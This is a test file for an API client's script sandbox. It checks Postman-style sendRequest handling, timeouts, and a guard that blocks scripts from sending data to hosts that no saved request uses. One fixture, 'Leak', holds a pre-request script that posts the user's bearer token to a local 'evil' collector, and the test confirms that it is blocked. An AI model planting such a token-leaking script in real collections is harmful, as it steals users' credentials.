import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
vi.mock("@tauri-apps/api/core", () => import("../../cli/tauriShim"));
vi.mock("@tauri-apps/api/event", () => import("../../cli/tauriShim"));
vi.mock("@tauri-apps/plugin-opener", () => import("../../cli/tauriShim"));
import { createServer, type Server } from "node:http";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { cli } from "../../cli/main";
import { nodeScriptHost } from "../../cli/scriptHost";
import { defaults } from "../types";

const request = { method: "GET", url: "https://x.test", headers: [], body: "" };

describe("sending from scripts (sandbox side)", () => {
  it("doesn't count time waiting on a request toward the timeout, but still stops busy loops", async () => {
    const slow = { send: () => new Promise<any>((r) => setTimeout(() => r({ status: 200, statusText: "OK", headers: [], body: '{"ok":true}', timeMs: 600, size: 11 }), 600)) };
    const out = await nodeScriptHost({ code: 'const r = await pm.sendRequest("https://x.test/slow");\npm.test("ok", () => pm.expect(r.json().ok).to.be.true);', phase: "pre", name: "r", vars: {}, request }, 300, slow);
    expect(out.tests).toEqual([{ name: "ok", pass: true }]);
    await expect(nodeScriptHost({ code: "await pm.sendRequest('https://x.test/slow'); const t = Date.now(); while (Date.now() - t < 1000) {}", phase: "pre", name: "r", vars: {}, request }, 300, slow)).rejects.toThrow(/longer than|timed out/);
  });

  it("turns Postman request forms into plain requests", async () => {
    const seen: any[] = [];
    const api = { send: async (r: any) => (seen.push(r), { status: 200, statusText: "OK", headers: [], body: "{}", timeMs: 1, size: 2 }) };
    await nodeScriptHost(
      {
        code: `await pm.sendRequest({ url: "https://a.test/token", method: "post", header: [{ key: "X-A", value: "1" }, { key: "X-Off", value: "0", disabled: true }], body: { mode: "urlencoded", urlencoded: [{ key: "grant_type", value: "client credentials" }] } });
await pm.sendRequest({ url: "https://a.test/gql", header: { Accept: "application/json" }, body: { mode: "graphql", graphql: { query: "{ me { id } }", variables: "{}" } } });
await bru.sendRequest({ url: "https://a.test/b", method: "put", data: { a: 1 } });`,
        phase: "pre",
        name: "r",
        vars: {},
        request,
      },
      2000,
      api,
    );
    expect(seen).toEqual([
      { method: "POST", url: "https://a.test/token", headers: [{ key: "X-A", value: "1" }, { key: "Content-Type", value: "application/x-www-form-urlencoded" }], body: "grant_type=client%20credentials" },
      { method: "POST", url: "https://a.test/gql", headers: [{ key: "Accept", value: "application/json" }, { key: "Content-Type", value: "application/json" }], body: '{"query":"{ me { id } }","variables":{}}' },
      { method: "PUT", url: "https://a.test/b", headers: [{ key: "Content-Type", value: "application/json" }], body: '{"a":1}' },
    ]);
  });

  it("refuses relative URLs and reports send errors to callbacks", async () => {
    const out = await nodeScriptHost(
      { code: 'pm.sendRequest("/relative", (err) => pm.test("got error", () => pm.expect(String(err)).to.include("full http")));', phase: "pre", name: "r", vars: {}, request },
      2000,
      { send: async () => ({ status: 200, statusText: "", headers: [], body: "", timeMs: 0, size: 0 }) },
    );
    expect(out.tests).toEqual([{ name: "got error", pass: true }]);
  });
});

describe("sending from scripts in a real run", () => {
  const servers: Server[] = [];
  const stolen: string[] = [];
  let ws = "";
  const listen = async (h: Parameters<typeof createServer>[1]) => {
    const s = createServer(h);
    servers.push(s);
    await new Promise<void>((r) => s.listen(0, "127.0.0.1", r));
    return `http://127.0.0.1:${(s.address() as { port: number }).port}`;
  };
  beforeAll(async () => {
    const api = await listen((rq, rs) => {
      let body = "";
      rq.on("data", (c) => (body += c));
      rq.on("end", () => {
        rs.setHeader("content-type", "application/json");
        if (rq.url === "/token") return rs.end(JSON.stringify(body.includes("grant_type=client_credentials") ? { access_token: "fresh-token-123" } : { error: "bad" }));
        rs.statusCode = rq.headers.authorization === "Bearer fresh-token-123" ? 200 : 401;
        rs.end("{}");
      });
    });
    const evil = await listen((rq, rs) => (stolen.push(`${rq.url} ${rq.headers["x-t"] ?? ""}`), rs.end("{}")));
    ws = mkdtempSync(join(tmpdir(), "forge-send-"));
    const write = (rel: string, data: object) => {
      mkdirSync(join(ws, rel, ".."), { recursive: true });
      writeFileSync(join(ws, rel), JSON.stringify({ forge: 1, ...defaults.http(), ...data }));
    };
    mkdirSync(join(ws, "environments"), { recursive: true });
    writeFileSync(join(ws, "environments/ci.json"), JSON.stringify({ name: "CI", vars: [{ key: "baseUrl", value: api, enabled: true }] }));
    // The classic Postman token refresh, callback style.
    write("collections/S/1 orders.json", {
      name: "Orders",
      url: "{{baseUrl}}/orders",
      auth: { type: "bearer", token: "{{token}}" },
      preScript: `pm.sendRequest({ url: pm.environment.get("baseUrl") + "/token", method: "POST", body: { mode: "urlencoded", urlencoded: [{ key: "grant_type", value: "client_credentials" }] } }, (err, res) => {
  pm.environment.set("token", res.json().access_token);
});`,
      assertions: [{ enabled: true, source: "status", path: "", op: "eq", value: "200" }],
    });
    // A script quietly posting your token somewhere else.
    write("collections/S/2 leak.json", { name: "Leak", url: "{{baseUrl}}/orders", auth: { type: "bearer", token: "{{token}}" }, preScript: `await pm.sendRequest({ url: "${evil}/collect", header: { "X-T": pm.environment.get("token") } });` });
  });
  afterAll(() => servers.forEach((s) => s.close()));

  it("fetches a token from your own API, and blocks sending it anywhere else", async () => {
    let out = "";
    const code = await cli(["run", "S", "--env", "ci"], { out: (s) => (out += s), err: (s) => (out += s), env: {}, cwd: ws, isTTY: false });
    expect(out).toContain("✓ GET    S/1 orders.json  200");
    expect(out).toMatch(/S\/2 leak\.json  error\n\s+Pre-request script: Error: Blocked: A script in "Leak" wants to send GET\. Request to 127\.0\.0\.1:\d+, which none of your saved requests use/);
    expect(stolen).toEqual([]);
    expect(code).toBe(1);
  });
});
